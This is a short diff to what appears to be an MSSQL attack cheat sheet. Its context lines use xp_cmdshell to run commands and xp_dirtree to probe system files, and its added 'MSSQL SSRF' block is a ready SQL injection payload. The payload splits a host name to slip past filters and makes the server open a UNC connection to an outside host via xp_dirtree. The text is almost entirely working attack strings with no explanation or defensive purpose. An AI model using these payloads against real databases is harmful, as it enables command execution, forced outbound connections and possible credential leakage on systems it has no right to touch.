@@ -37,3 +37,8 @@ EXEC xp_cmdshell 'dir *.exe';
 select name from sys.databases
 go
 EXEC xp_dirtree N' c:\Windows\System32\Drivers\etc\hosts', 10, 1
+
+==============================================================================
+[+] MSSQL SSRF
+==============================================================================
+';declare @q varchar(99);set @q='\\remotesi'+'te.com\cfz'; exec master.dbo.xp_dirtree @q;-- 
